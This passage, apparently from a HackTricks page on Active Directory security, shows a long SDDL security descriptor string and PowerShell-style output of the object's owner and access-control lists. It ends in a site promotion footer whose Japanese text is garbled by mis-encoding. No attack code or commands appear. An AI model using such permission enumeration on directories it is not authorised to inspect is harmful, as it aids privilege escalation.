91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
